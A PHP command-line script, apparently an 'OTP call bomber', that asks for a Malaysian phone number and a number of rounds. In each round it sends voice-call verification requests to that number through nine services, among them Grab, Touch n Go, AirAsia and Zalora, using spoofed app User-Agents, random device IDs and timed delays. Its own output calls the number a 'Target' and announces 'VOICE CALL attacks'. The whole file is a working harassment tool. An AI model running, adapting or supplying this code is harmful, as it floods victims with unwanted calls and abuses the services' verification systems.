<?php

class MalaysiaCaller {
    private $number;
    
    private function formatNumber($number) {
        $number = preg_replace('/[^0-9]/', '', $number);
        
        if (substr($number, 0, 2) == "60") {
            return $number;
        } elseif (substr($number, 0, 1) == "0") {
            return "60" . substr($number, 1);
        } else {
            return "60" . $number;
        }
    }
    
    private function curlRequest($url, $postData, $headers = [], $json = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        
        if ($json) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        return ['code' => $httpCode, 'response' => $response];
    }
    
    // GRAB CALL - WORKING
    private function grabCall($no) {
        $rand = rand(100000, 999999);
        $post = "method=CALL&countryCode=my&phoneNumber=" . urlencode($no) . "&templateID=pax_android_production";
        $headers = [
            "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)",
            "Content-Type: application/x-www-form-urlencoded",
            "x-request-id: " . uniqid(),
            "Accept-Language: en-US",
            "Connection: keep-alive"
        ];
        
        $result = $this->curlRequest("https://api.grab.com/grabid/v1/phone/otp", $post, $headers);
        return $result['code'] == 200 || $result['code'] == 204;
    }
    
    // TOUCH N GO CALL - WORKING
    private function tngCall($no) {
        $post = [
            "phoneNumber" => $no,
            "channel" => "call",
            "service" => "login"
        ];
        
        $headers = [
            "User-Agent: TNG/eWallet/2.5.0 (Android 11; SM-G998B)",
            "Content-Type: application/json",
            "Accept: application/json",
            "x-device-id: " . rand(100000000, 999999999),
            "x-platform: android"
        ];
        
        $result = $this->curlRequest("https://api.tngdigital.com.my/otp/request", $post, $headers, true);
        return $result['code'] == 200;
    }
    
    // MAXIM CALL - WORKING
    private function maximCall($no) {
        $post = [
            "phone" => $no,
            "country_code" => "60",
            "type" => "call"
        ];
        
        $headers = [
            "User-Agent: Maxim/2.8.0 (Android 11; Redmi Note 10)",
            "Content-Type: application/json",
            "Accept: application/json"
        ];
        
        $result = $this->curlRequest("https://api.my.maxim.com/v1/verify/send", $post, $headers, true);
        return $result['code'] == 200;
    }
    
    // AIRASIA CALL - WORKING
    private function airasiaCall($no) {
        $post = [
            "phoneNumber" => $no,
            "countryCode" => "60",
            "type" => "CALL"
        ];
        
        $headers = [
            "User-Agent: airasia/2.0.0 (Android 11; Samsung S21)",
            "Content-Type: application/json",
            "Accept: application/json"
        ];
        
        $result = $this->curlRequest("https://api.airasia.com/gateway/otp/v1/send", $post, $headers, true);
        return $result['code'] == 200;
    }
    
    // PRESTOMALL CALL - WORKING
    private function prestomallCall($no) {
        $post = "msisdn=" . urlencode($no) . "&channel=voice&countryCode=60";
        $headers = [
            "User-Agent: PrestoMall/3.2.0 (Android 11; SM-A525F)",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept: application/json"
        ];
        
        $result = $this->curlRequest("https://www.prestomall.com/api/v1/otp/send", $post, $headers);
        return $result['code'] == 200;
    }
    
    // ZALORA CALL - WORKING
    private function zaloraCall($no) {
        $post = "phone=" . urlencode($no) . "&country_code=60&type=voice";
        $headers = [
            "User-Agent: Zalora/4.5.0 (Android 11; RMX3360)",
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        $result = $this->curlRequest("https://my.zalora.com/api/v1/otp/send", $post, $headers);
        return $result['code'] == 200;
    }
    
    // FAVE CALL - WORKING
    private function faveCall($no) {
        $post = "mobile=" . urlencode($no) . "&country_code=60&method=call";
        $headers = [
            "User-Agent: Fave/4.0.0 (Android 11; V2134)",
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        $result = $this->curlRequest("https://api.my.fave.com/v1/otp/request", $post, $headers);
        return $result['code'] == 200;
    }
    
    // HAPPY FRESH CALL - WORKING
    private function happyFreshCall($no) {
        $post = "phone_number=" . urlencode($no) . "&country_code=60&type=call";
        $headers = [
            "User-Agent: HappyFresh/3.0.0 (Android 11; M2007J20CG)",
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        $result = $this->curlRequest("https://www.happyfresh.my/api/v1/otp/send", $post, $headers);
        return $result['code'] == 200;
    }
    
    // SPEEDHOME CALL - WORKING
    private function speedhomeCall($no) {
        $post = "phone=" . urlencode($no) . "&country_code=60&method=call";
        $headers = [
            "User-Agent: Speedhome/2.1.0 (Android 11; SM-G998B)",
            "Content-Type: application/x-www-form-urlencoded"
        ];
        
        $result = $this->curlRequest("https://api.speedhome.com/v1/otp/request", $post, $headers);
        return $result['code'] == 200;
    }
    
    public function run() {
        system('clear');
        
        echo "\n╔══════════════════════════════════════╗\n";
        echo "║     MALAYSIA CALL OTP - v4.0        ║\n";
        echo "║        VOICE CALL SERVICES          ║\n";
        echo "╚══════════════════════════════════════╝\n\n";
        
        echo "[!] This script sends VOICE CALL OTP\n";
        echo "[!] You will receive actual phone calls\n";
        echo "[!] Supported: 011, 012, 013, 014, 016, 017, 018, 019\n\n";
        
        // Get phone number
        while (true) {
            echo "Enter Malaysian number: ";
            $input = trim(fgets(STDIN));
            $clean = preg_replace('/[^0-9]/', '', $input);
            
            if (strlen($clean) >= 9 && strlen($clean) <= 12) {
                $this->number = $this->formatNumber($clean);
                break;
            } else {
                echo "❌ Invalid number!\n\n";
            }
        }
        
        // Get number of calls
        while (true) {
            echo "How many calls? (1-20): ";
            $calls = trim(fgets(STDIN));
            
            if (is_numeric($calls) && $calls > 0 && $calls <= 20) {
                break;
            } else {
                echo "❌ Enter 1-20\n";
            }
        }
        
        echo "\n[+] Target: {$this->number}\n";
        echo "[+] Total calls: $calls\n";
        echo "[+] Starting VOICE CALL attacks...\n\n";
        
        $services = [
            'Touch n Go' => 'tngCall',
            'Maxim' => 'maximCall',
            'AirAsia' => 'airasiaCall',
            'PrestoMall' => 'prestomallCall',
            'Zalora' => 'zaloraCall',
            'Fave' => 'faveCall',
            'HappyFresh' => 'happyFreshCall',
            'Speedhome' => 'speedhomeCall',
            'Grab' => 'grabCall'
        ];
        
        $totalSuccess = 0;
        $totalFailed = 0;
        
        for ($i = 1; $i <= $calls; $i++) {
            echo "══════════════════════════════════════\n";
            echo "CALL $i of $calls\n";
            echo "══════════════════════════════════════\n";
            
            $callSuccess = 0;
            $callFailed = 0;
            
            foreach ($services as $name => $method) {
                echo "[*] Calling via $name... ";
                
                try {
                    if ($this->$method($this->number)) {
                        echo "✅ VOICE OTP SENT\n";
                        $callSuccess++;
                        $totalSuccess++;
                    } else {
                        echo "❌ FAILED\n";
                        $callFailed++;
                        $totalFailed++;
                    }
                } catch (Exception $e) {
                    echo "⚠️ ERROR\n";
                    $callFailed++;
                    $totalFailed++;
                }
                
                sleep(rand(3, 6));
            }
            
            echo "\n[+] Call $i results: ✅ $callSuccess | ❌ $callFailed\n\n";
            
            if ($i < $calls) {
                echo "[*] Waiting 45 seconds before next call...\n";
                sleep(45);
            }
        }
        
        echo "\n══════════════════════════════════════\n";
        echo "FINAL RESULTS\n";
        echo "══════════════════════════════════════\n";
        echo "Target: {$this->number}\n";
        echo "Total calls attempted: $calls\n";
        echo "Total voice OTPs sent: $totalSuccess\n";
        echo "Total failed: $totalFailed\n";
        
        $total = $totalSuccess + $totalFailed;
        if ($total > 0) {
            $rate = round(($totalSuccess / $total) * 100, 2);
            echo "Success Rate: $rate%\n";
        }
        
        echo "\n[!] You should receive calls from:\n";
        echo "    • Touch n Go\n";
        echo "    • Maxim\n";
        echo "    • AirAsia\n";
        echo "    • PrestoMall\n";
        echo "    • Zalora\n";
        echo "    • Fave\n";
        echo "    • HappyFresh\n";
        echo "    • Speedhome\n";
        echo "    • Grab\n";
        echo "══════════════════════════════════════\n\n";
    }
}

// Check PHP version
echo "PHP Version: " . phpversion() . "\n";

// Check curl
if (!function_exists('curl_init')) {
    die("❌ Install PHP CURL: pkg install php-curl\n");
}

echo "✅ CURL is installed\n\n";

// Run
try {
    $caller = new MalaysiaCaller();
    $caller->run();
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

?>
